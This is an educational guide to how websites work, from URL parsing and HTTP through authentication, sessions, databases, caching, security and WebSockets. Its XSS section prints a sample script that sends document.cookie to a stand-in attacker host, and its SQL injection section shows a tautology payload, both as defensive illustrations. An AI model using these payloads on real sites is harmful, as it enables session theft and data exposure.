# How Websites Work — From Browser to Server

> A complete guide covering every layer of a website: from the moment you type a URL to authentication, sessions, authorization, and everything in between.

---

## Table of Contents

1. [Browser: The Starting Point](#1-browser-the-starting-point)
2. [HTTP Request — What Gets Sent](#2-http-request--what-gets-sent)
3. [Server — Receiving the Request](#3-server--receiving-the-request)
4. [Rendering the Page](#4-rendering-the-page)
5. [Authentication](#5-authentication)
6. [Sessions](#6-sessions)
7. [Authorization](#7-authorization)
8. [APIs & Data Fetching](#8-apis--data-fetching)
9. [Databases](#9-databases)
10. [Caching](#10-caching)
11. [Security Layers](#11-security-layers)
12. [WebSockets & Real-Time Communication](#12-websockets--real-time-communication)
13. [Full Request Lifecycle — End to End](#13-full-request-lifecycle--end-to-end)

---

## 1. Browser: The Starting Point

When you type a URL like `https://example.com/dashboard` into your browser and press Enter, the browser begins a multi-step process.

### 1.1 URL Parsing

The browser breaks down the URL into its components:

```
https://example.com/dashboard?tab=home#section1
│       │           │          │        │
scheme  host        path       query    fragment
```

- **Scheme** (`https`) → tells the browser to use a secure, encrypted connection.
- **Host** (`example.com`) → the target server's domain.
- **Path** (`/dashboard`) → the specific resource/page being requested.
- **Query String** (`?tab=home`) → optional parameters sent to the server.
- **Fragment** (`#section1`) → handled entirely by the browser; never sent to the server. Used to scroll to a section.

### 1.2 Browser Cache Check

Before sending any request, the browser checks its local cache:

- **Memory Cache** — Extremely fast; stores resources from the current session (JS, CSS, images).
- **Disk Cache** — Persists across sessions. Controlled by HTTP response headers like `Cache-Control` and `ETag`.
- **Service Worker Cache** — A programmable cache that intercepts all requests (used in Progressive Web Apps).

If a fresh, valid cached response exists, the browser uses it and skips the network entirely.

### 1.3 Browser Sends the Request

If no valid cache exists, the browser:
1. Looks up the server IP (DNS resolution — skipping per your request).
2. Establishes a TCP connection.
3. Performs a **TLS Handshake** (for HTTPS).
4. Sends the HTTP request.

---

## 2. HTTP Request — What Gets Sent

### 2.1 Structure of an HTTP Request

```
GET /dashboard HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 ...
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Cookie: session_id=abc123xyz; theme=dark
Authorization: Bearer eyJhbGciOi...
Connection: keep-alive
```

Every HTTP request has:

| Part | Description |
|---|---|
| **Method** | `GET`, `POST`, `PUT`, `PATCH`, `DELETE` — describes the action |
| **Path** | The resource being requested (`/dashboard`) |
| **Headers** | Metadata: cookies, content type, auth tokens, browser info |
| **Body** | Data payload (only in `POST`/`PUT`/`PATCH` requests) |

### 2.2 HTTP Methods Explained

| Method | Purpose | Has Body? |
|---|---|---|
| `GET` | Fetch a resource | No |
| `POST` | Create a resource / Submit data | Yes |
| `PUT` | Replace a resource entirely | Yes |
| `PATCH` | Update part of a resource | Yes |
| `DELETE` | Remove a resource | No |

### 2.3 The TLS Handshake (HTTPS)

Before data flows, the browser and server negotiate an encrypted channel:

```
Browser                          Server
   │                                │
   │──── ClientHello ──────────────>│  (I support TLS 1.3, here are my cipher suites)
   │<─── ServerHello ───────────────│  (Let's use AES-256, here's my certificate)
   │──── Key Exchange ─────────────>│  (Encrypted pre-master secret)
   │<─── Finished ──────────────────│  (Session keys established)
   │══════ Encrypted Data ══════════│  (All further communication is encrypted)
```

After the handshake, all data is **encrypted** — no one in between can read it.

---

## 3. Server — Receiving the Request

### 3.1 Load Balancer

Large websites don't run on a single server. A **Load Balancer** sits in front of many servers and distributes incoming requests:

```
                    ┌─────────────┐
                    │ Load        │──> Server A
Browser ──Request──>│ Balancer    │──> Server B
                    │             │──> Server C
                    └─────────────┘
```

Common strategies:
- **Round Robin** — requests go to servers in order.
- **Least Connections** — routes to the least busy server.
- **IP Hash** — same user always hits the same server (useful for sticky sessions).

### 3.2 Web Server

The **Web Server** (e.g., Nginx, Apache) handles the raw HTTP connection:

- Serves **static files** directly (HTML, CSS, images, fonts) without involving app logic.
- **Reverse proxies** dynamic requests to the Application Server.

### 3.3 Application Server

The **Application Server** runs your actual code (Node.js, Python/Django, Ruby on Rails, Java Spring, etc.):

```
Incoming Request
        │
        ▼
   [ Router ] ──────> Matches URL to a handler function
        │
        ▼
  [ Middleware ] ────> Runs checks: auth, logging, rate limiting
        │
        ▼
  [ Controller ] ────> Business logic
        │
        ▼
  [ Model/ORM ] ─────> Queries the database
        │
        ▼
  [ Response ] ──────> Sends data back (HTML or JSON)
```

### 3.4 Middleware

Middleware is code that runs **between** the request arriving and the final handler executing. Common middleware:

- **Logging** — records every request.
- **Rate Limiter** — blocks excessive requests from one IP.
- **Body Parser** — converts raw request body (JSON, form data) into usable objects.
- **Auth Middleware** — checks tokens/cookies before allowing access.
- **CORS Middleware** — controls which origins can make requests.

---

## 4. Rendering the Page

### 4.1 Server-Side Rendering (SSR)

The server builds the full HTML page and sends it:

```
Server builds HTML ──> Sends complete HTML ──> Browser displays it immediately
```

**Pros:** Fast initial load, great for SEO.
**Cons:** Server does more work per request.

Used by: Next.js (SSR mode), Ruby on Rails, Django templates, PHP.

### 4.2 Client-Side Rendering (CSR)

The server sends a bare HTML shell + JavaScript. The browser renders everything:

```
Server sends shell HTML + JS bundle
        │
        ▼
Browser downloads and runs JavaScript
        │
        ▼
JS fetches data from API
        │
        ▼
JS renders the UI in the browser
```

**Pros:** Rich, app-like experience after initial load.
**Cons:** Slower first paint, poor SEO if not handled carefully.

Used by: React SPA, Angular, Vue.

### 4.3 The Browser Rendering Pipeline

Once the HTML arrives, the browser does the following:

```
HTML ──> DOM Tree
CSS  ──> CSSOM Tree
          │
          ▼
     Render Tree (combined)
          │
          ▼
     Layout (calculate sizes/positions)
          │
          ▼
     Paint (draw pixels)
          │
          ▼
     Composite (layer GPU-accelerated layers)
          │
          ▼
     Screen Output 🖥️
```

- **DOM (Document Object Model)** — a tree of all HTML elements. JavaScript can read and modify this.
- **CSSOM** — a tree of CSS rules applied to each DOM node.
- **Render Tree** — combines DOM + CSSOM; only includes visible elements.
- **Reflow / Repaint** — triggered whenever JS modifies the DOM; expensive if done too often.

### 4.4 JavaScript Loading

Scripts can block rendering unless handled properly:

```html
<!-- BLOCKS rendering — bad for performance -->
<script src="app.js"></script>

<!-- Downloads in parallel, runs after HTML is parsed -->
<script src="app.js" defer></script>

<!-- Downloads in parallel, runs immediately when ready -->
<script src="app.js" async></script>
```

---

## 5. Authentication

Authentication answers: **"Who are you?"**

### 5.1 What Happens During Login

```
User enters email + password
        │
        ▼
Browser sends POST /login
{ "email": "user@example.com", "password": "secret" }
        │
        ▼
Server receives credentials
        │
        ▼
Server looks up user in DB by email
        │
        ▼
Server compares password hash
(password never stored as plain text!)
        │
     ┌──┴──┐
  Match?   No Match?
     │         │
     ▼         ▼
  Issue      Return 401
  Token    Unauthorized
```

### 5.2 Password Hashing

Passwords are **never** stored in plain text. They're hashed using a one-way algorithm:

```
"secret123"  ──[bcrypt]──>  "$2b$12$KIXQkm3bGPRyUCo..."

Input: "secret123"  ──[bcrypt.compare]──>  Match ✅
Input: "wrongpass"  ──[bcrypt.compare]──>  No Match ❌
```

Common hashing algorithms: **bcrypt**, **argon2**, **scrypt**.

Key properties:
- **One-way** — you can't reverse the hash to get the original password.
- **Salted** — a random value is added before hashing to prevent rainbow table attacks.
- **Slow by design** — makes brute-force attacks computationally expensive.

### 5.3 Authentication Methods

#### A. Cookie-Based Authentication (Traditional)

```
1. User logs in → Server creates a session → Stores it in DB
2. Server sends: Set-Cookie: session_id=abc123; HttpOnly; Secure
3. Browser stores cookie and sends it with every request automatically
4. Server looks up session_id in DB to identify user
```

#### B. Token-Based Authentication (JWT)

```
1. User logs in → Server creates a JWT (JSON Web Token)
2. Server sends JWT back in response body
3. Browser stores it (localStorage or memory)
4. Browser sends it manually: Authorization: Bearer <token>
5. Server verifies JWT signature — NO database lookup needed
```

**JWT Structure:**

```
eyJhbGciOiJIUzI1NiJ9   .   eyJ1c2VySWQiOiIxMjMifQ   .   SflKxwRJSMeKKF...
│                           │                             │
Header                      Payload                       Signature
(algorithm)                 (user data)                   (proves validity)
```

The server signs the token with a secret key. It can verify any incoming token without hitting the database.

#### C. OAuth 2.0 / Social Login ("Login with Google")

```
User clicks "Login with Google"
        │
        ▼
Browser redirects to Google's login page
        │
        ▼
User logs in on Google
        │
        ▼
Google redirects back with an Authorization Code
        │
        ▼
Your server exchanges code for Access Token (server-to-server)
        │
        ▼
Your server fetches user info from Google
        │
        ▼
Your server creates a session for the user
```

**Key OAuth roles:**
- **Resource Owner** — the user.
- **Client** — your application.
- **Authorization Server** — Google/GitHub/Facebook.
- **Resource Server** — Google's API that returns user info.

#### D. Multi-Factor Authentication (MFA)

After password verification, the server requires a second proof:

```
Password ✅ → Prompt for OTP
                    │
        ┌───────────┴───────────┐
        │                       │
   TOTP App              SMS Code
  (Google Auth)          (6-digit)
        │                       │
        └───────────┬───────────┘
                    │
              Verify OTP
                    │
              Login ✅
```

---

## 6. Sessions

A **session** is how a server remembers a user across multiple requests (since HTTP is stateless by nature — each request is independent).

### 6.1 How Sessions Work

```
Request 1: POST /login
  Server creates session: { sessionId: "abc123", userId: 42, expires: ... }
  Stores in session store (DB/Redis)
  Sends back: Set-Cookie: session_id=abc123; HttpOnly

Request 2: GET /dashboard
  Browser sends: Cookie: session_id=abc123
  Server looks up "abc123" in session store → finds userId: 42
  Knows who the user is ✅

Request 3: POST /logout
  Server deletes "abc123" from session store
  Sends: Set-Cookie: session_id=; Max-Age=0 (clears cookie)
  User is logged out ✅
```

### 6.2 Session Storage Options

| Storage | Speed | Persistent | Scalable | Use Case |
|---|---|---|---|---|
| **In-Memory** | Fastest | No | No (single server) | Development |
| **Redis** | Very fast | Yes | Yes | Production (most common) |
| **Database** | Slower | Yes | Yes | When Redis isn't available |

### 6.3 Cookie Security Flags

| Flag | What It Does |
|---|---|
| `HttpOnly` | JS cannot access the cookie — prevents XSS theft |
| `Secure` | Cookie only sent over HTTPS |
| `SameSite=Strict` | Cookie not sent on cross-site requests — prevents CSRF |
| `SameSite=Lax` | Cookie sent on top-level navigation but not sub-requests |
| `Max-Age` / `Expires` | Controls when the cookie expires |

### 6.4 JWT vs Session-Cookie

| | JWT (Stateless) | Session Cookie (Stateful) |
|---|---|---|
| **Server stores state?** | No | Yes (in DB/Redis) |
| **Can be revoked instantly?** | Hard (must wait for expiry) | Yes (delete from store) |
| **Works across servers?** | Yes (just verify signature) | Yes (if using shared store like Redis) |
| **Token size** | Larger (contains data) | Small (just an ID) |

---

## 7. Authorization

Authorization answers: **"What are you allowed to do?"**

This is separate from authentication. A user can be authenticated (logged in) but still unauthorized to access certain resources.

### 7.1 Role-Based Access Control (RBAC)

Users are assigned roles. Roles have permissions:

```
Roles:
  admin   → can: create, read, update, delete
  editor  → can: create, read, update
  viewer  → can: read only

User: Alice (role: editor)
  GET  /articles       ✅ Allowed
  POST /articles       ✅ Allowed
  DELETE /articles/5   ❌ Forbidden (403)
```

### 7.2 Attribute-Based Access Control (ABAC)

More granular — decisions based on attributes of user, resource, and environment:

```
Can Alice edit Article #42?

Rule: user.role == "editor"
  AND article.authorId == user.id
  AND currentTime < article.lockTime

Alice is editor ✅, is the author ✅, article not locked ✅
→ Access Granted ✅
```

### 7.3 How Authorization is Enforced

```
Request: DELETE /posts/99
        │
        ▼
Auth Middleware
  → Verify token/session → userId = 42
        │
        ▼
Authorization Check
  → Fetch post #99 from DB
  → post.authorId = 42? ✅
  → user.role = "admin"? ✅
        │
        ▼
      Allow ✅
        │
        ▼
Delete post from DB
        │
        ▼
Return 200 OK
```

### 7.4 HTTP Status Codes for Auth

| Code | Meaning |
|---|---|
| `401 Unauthorized` | Not authenticated (not logged in) |
| `403 Forbidden` | Authenticated but not authorized |
| `404 Not Found` | Sometimes used instead of 403 to hide resource existence |

---

## 8. APIs & Data Fetching

### 8.1 REST API

The most common style. Resources are represented as URLs, and HTTP methods define the action:

```
GET    /users         → List all users
GET    /users/42      → Get user with ID 42
POST   /users         → Create a new user
PUT    /users/42      → Replace user 42
PATCH  /users/42      → Update parts of user 42
DELETE /users/42      → Delete user 42
```

### 8.2 GraphQL

A query language where the client specifies exactly what data it needs:

```graphql
query {
  user(id: "42") {
    name
    email
    posts {
      title
      createdAt
    }
  }
}
```

**Advantages over REST:**
- No over-fetching (only get what you ask for).
- No under-fetching (get nested data in one request).
- Single endpoint (`/graphql`).

### 8.3 Request Lifecycle from Frontend

```javascript
// Browser-side fetch
const response = await fetch('/api/user/42', {
  method: 'GET',
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  }
});

const data = await response.json();
```

What happens:
1. Browser sends request with headers.
2. Server validates the token.
3. Server queries DB.
4. Server responds with JSON.
5. Browser receives and parses JSON.
6. UI re-renders with new data.

---

## 9. Databases

### 9.1 Types of Databases

| Type | Examples | Best For |
|---|---|---|
| **Relational (SQL)** | PostgreSQL, MySQL | Structured data, relationships, transactions |
| **Document (NoSQL)** | MongoDB, Firestore | Flexible schema, nested documents |
| **Key-Value** | Redis, DynamoDB | Caching, sessions, simple lookups |
| **Search** | Elasticsearch | Full-text search |
| **Graph** | Neo4j | Highly connected data (social networks) |

### 9.2 How a Database Query Works

```
Application Code
  const user = await db.query('SELECT * FROM users WHERE id = $1', [42]);

        │
        ▼
ORM / Query Builder (e.g., Prisma, Sequelize)
  Generates safe SQL with parameterized queries (prevents SQL injection)

        │
        ▼
Database Connection Pool
  Reuses existing connections (expensive to create new ones for every request)

        │
        ▼
Database Engine
  1. Parses SQL
  2. Checks query cache
  3. Uses indexes to find rows fast
  4. Returns result rows

        │
        ▼
Back to Application → sent to user
```

### 9.3 SQL Injection — And Why Parameterized Queries Matter

```sql
-- DANGEROUS: User input directly in query
SELECT * FROM users WHERE email = 'user@example.com' OR '1'='1';
-- Returns ALL users! 💀

-- SAFE: Parameterized query
SELECT * FROM users WHERE email = $1;
-- $1 is treated as data, never as SQL code ✅
```

### 9.4 Transactions

When multiple DB operations must all succeed or all fail:

```sql
BEGIN;
  UPDATE accounts SET balance = balance - 500 WHERE id = 1;  -- Debit
  UPDATE accounts SET balance = balance + 500 WHERE id = 2;  -- Credit
COMMIT;  -- Both succeed, or...
ROLLBACK; -- Neither happens if something fails
```

---

## 10. Caching

Caching stores results of expensive operations so repeated requests are faster.

### 10.1 Caching Layers

```
Browser Request
      │
      ▼
Browser Cache ────────────────────────────────────────── (fastest)
      │ (miss)
      ▼
CDN Cache (Cloudflare, Fastly) ────────────────────────── (very fast, geographically close)
      │ (miss)
      ▼
Server-Side Cache (Redis) ─────────────────────────────── (fast, avoids DB)
      │ (miss)
      ▼
Application Logic + Database ─────────────────────────── (slowest, source of truth)
```

### 10.2 Cache-Control Headers

```
Cache-Control: public, max-age=86400     → Cache for 1 day, anyone can cache it
Cache-Control: private, max-age=300      → Cache for 5 min, browser only (not CDN)
Cache-Control: no-store                  → Never cache (sensitive pages like banking)
Cache-Control: no-cache                  → Cache but always validate with server first
ETag: "abc123"                           → A fingerprint of the content for validation
```

### 10.3 Cache Invalidation

When underlying data changes, you must invalidate the cache:

```
Strategy 1: TTL (Time-To-Live)
  Cache expires after N seconds automatically.

Strategy 2: Event-Driven Invalidation
  When user updates profile → delete "user:42" from Redis immediately.

Strategy 3: Cache-Aside
  Read: Check cache → if miss → fetch from DB → store in cache → return.
  Write: Update DB → delete cache entry.
```

---

## 11. Security Layers

### 11.1 CORS (Cross-Origin Resource Sharing)

By default, browsers block JS on `app.com` from fetching `api.otherdomain.com`. CORS is a set of headers that allow or deny such cross-origin requests.

```
Browser sends request from frontend.com to api.backend.com:

Request:  Origin: https://frontend.com
Response: Access-Control-Allow-Origin: https://frontend.com ✅

If header is missing or doesn't match → Browser blocks the response ❌
```

### 11.2 CSRF (Cross-Site Request Forgery)

An attacker's site tricks your logged-in browser into making unwanted requests.

**Prevention:**
- **CSRF Tokens** — a secret, random token embedded in forms. Server verifies it.
- **SameSite Cookie** — browser won't send cookie on cross-site requests.
- **Check Origin/Referer headers** — server validates the request origin.

### 11.3 XSS (Cross-Site Scripting)

An attacker injects malicious JavaScript into your page.

```html
<!-- Attacker input that gets stored and displayed to other users -->
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
```

**Prevention:**
- **HTML Escape** all user-generated content before rendering.
- **Content Security Policy (CSP)** header — limits which scripts can run.
- **HttpOnly cookies** — JS cannot read session cookies even if XSS succeeds.

### 11.4 Rate Limiting

Prevents abuse, brute-force attacks, and DDoS:

```
Rule: Max 5 login attempts per IP per minute
      Max 100 API requests per user per minute

Response when exceeded: 429 Too Many Requests
  Retry-After: 60 (seconds)
```

### 11.5 HTTPS / TLS

All traffic between browser and server is encrypted. Without it:

```
Without HTTPS:
  Browser ──[username=alice&password=secret]──> (anyone on network can read this) ──> Server

With HTTPS:
  Browser ──[X9$kL#2mP@qR...]──> (encrypted garbage to any eavesdropper) ──> Server
```

---

## 12. WebSockets & Real-Time Communication

Regular HTTP is **request-response** — the client always initiates. For real-time apps (chat, live notifications, games), you need persistent, two-way connections.

### 12.1 WebSocket Handshake

```
Client: GET /chat HTTP/1.1
        Upgrade: websocket
        Connection: Upgrade

Server: HTTP/1.1 101 Switching Protocols
        Upgrade: websocket

[Connection is now open — both sides can send messages anytime]
```

### 12.2 WebSocket vs HTTP Polling vs SSE

| Method | Direction | Use Case |
|---|---|---|
| **HTTP Polling** | Client → Server (repeated) | Simple, wasteful |
| **Long Polling** | Client waits for server response | Better, but still HTTP |
| **Server-Sent Events (SSE)** | Server → Client only | Notifications, feeds |
| **WebSockets** | Bidirectional | Chat, live games, collaboration |

### 12.3 Example: Chat Application Flow

```
User A types "Hello"
      │
      ▼
Browser sends message over WebSocket
      │
      ▼
Server receives message
      │
      ▼
Server saves to DB
      │
      ▼
Server broadcasts to all connected clients in the room
      │
      ▼
User B's browser receives message in real-time
      │
      ▼
UI updates instantly ⚡
```

---

## 13. Full Request Lifecycle — End to End

Let's trace a complete flow: **a logged-in user visits their dashboard**.

```
┌─────────────────────────────────────────────────────────────────┐
│                        BROWSER                                  │
│                                                                 │
│  1. User navigates to https://app.com/dashboard                 │
│  2. Browser checks cache → miss                                 │
│  3. TLS handshake with server (encrypted channel established)   │
│  4. Browser sends:                                              │
│       GET /dashboard HTTP/1.1                                   │
│       Cookie: session_id=abc123                                 │
└────────────────────────────┬────────────────────────────────────┘
                             │ HTTPS
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                      LOAD BALANCER                              │
│                                                                 │
│  5. Routes request to least-busy server                         │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                    WEB SERVER (Nginx)                           │
│                                                                 │
│  6. Receives request                                            │
│  7. Static file? → serve directly                               │
│  8. Dynamic route? → proxy to App Server                        │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                  APPLICATION SERVER                             │
│                                                                 │
│  9.  Router matches GET /dashboard → dashboardController        │
│  10. Middleware runs:                                           │
│        a. Logger: log the request                               │
│        b. Auth Middleware:                                      │
│           → Extract session_id from cookie                      │
│           → Lookup "abc123" in Redis                            │
│           → Found: { userId: 42, role: "editor" }              │
│           → Attach user to request context                      │
│        c. Rate Limiter: userId 42 is within limits ✅           │
│  11. Controller executes:                                       │
│        a. Authorization: does editor role have dashboard access? ✅
│        b. Fetch user's data from DB                             │
│        c. Fetch user's notifications from Redis cache           │
│        d. Build response object                                  │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                       DATABASE (PostgreSQL)                     │
│                                                                 │
│  12. Query: SELECT * FROM dashboard_data WHERE user_id = 42    │
│  13. Index on user_id → fast lookup                             │
│  14. Returns rows                                               │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                  APPLICATION SERVER (cont.)                     │
│                                                                 │
│  15. Data assembled → serialize to JSON (or render HTML)        │
│  16. Set response headers:                                      │
│        Content-Type: text/html                                  │
│        Cache-Control: private, max-age=0                        │
│        Set-Cookie: session_id=abc123; HttpOnly; Secure          │
│  17. Send HTTP 200 response                                     │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                        BROWSER (cont.)                          │
│                                                                 │
│  18. Receive HTML                                               │
│  19. Parse HTML → build DOM                                     │
│  20. Parse CSS → build CSSOM                                    │
│  21. Combine → Render Tree → Layout → Paint                     │
│  22. Load JS bundle                                             │
│  23. JS executes → fetch more data via API → update DOM         │
│  24. Page is fully interactive ✅                               │
│  25. WebSocket connection opened for live notifications         │
└─────────────────────────────────────────────────────────────────┘
```

---

## Summary Cheatsheet

| Concept | One-Line Summary |
|---|---|
| **HTTP** | The request-response protocol browsers and servers speak |
| **TLS/HTTPS** | Encrypts all traffic between browser and server |
| **Web Server** | Serves files and proxies requests (Nginx, Apache) |
| **App Server** | Runs your business logic (Node, Django, Rails) |
| **Middleware** | Code that runs on every request (auth, logging, rate limiting) |
| **Authentication** | Verifies who you are (login + password/token) |
| **Session** | Server-side memory of a logged-in user |
| **JWT** | Stateless, self-contained token — no server lookup needed |
| **Authorization** | Controls what authenticated users can access |
| **RBAC** | Permissions tied to roles (admin, editor, viewer) |
| **REST API** | URL + HTTP method = action on a resource |
| **GraphQL** | Client specifies exactly what data it needs |
| **SQL Injection** | Inserting malicious SQL — prevented by parameterized queries |
| **XSS** | Injecting JS into pages — prevented by escaping + CSP |
| **CSRF** | Forged cross-site requests — prevented by CSRF tokens + SameSite |
| **CORS** | Browser policy controlling cross-origin API calls |
| **Caching** | Storing results to avoid repeated expensive operations |
| **WebSockets** | Persistent bidirectional connection for real-time features |

---

*Document covers the full lifecycle from browser to server, including authentication, session management, authorization, rendering, APIs, databases, caching, security, and real-time communication.*
